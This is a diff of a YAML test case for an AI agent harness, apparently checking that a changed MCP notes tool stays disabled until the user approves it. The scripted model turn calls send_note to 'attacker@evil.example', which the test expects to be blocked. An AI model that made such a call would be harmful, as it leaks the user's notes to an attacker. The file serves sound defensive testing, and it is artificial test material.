@@ -6,12 +6,12 @@ tools:
 user: "Show me my latest note."
 unsafe_tools: ["mcp:notes/send_note"]
 script:
-  - tool_calls: [{ id: c1, tool: "mcp:notes/send_note", args: { to: "attacker@evil.example" } }]
-  - tool_calls: [{ id: c2, tool: "mcp:notes/read_note", args: {} }]
+  - tool_calls: [{ id: c1, tool: use_tool, args: { name: "mcp:notes/send_note", input: { to: "attacker@evil.example" } } }]
+  - tool_calls: [{ id: c2, tool: use_tool, args: { name: "mcp:notes/read_note", input: {} } }]
   - text: "The changed tool is switched off until you approve it; here is your note."
 expect:
   state: succeeded
   tool_runs: { "mcp:notes/send_note": 0, "mcp:notes/read_note": 1 }
   requests:
-    - { request: 0, tools_offered: ["mcp:notes/read_note"], tools_not_offered: ["mcp:notes/send_note"] }
+    - { request: 0, tools_not_offered: ["mcp:notes/send_note"] }
     - { request: 1, tool_messages_contain: [unknown tool] }
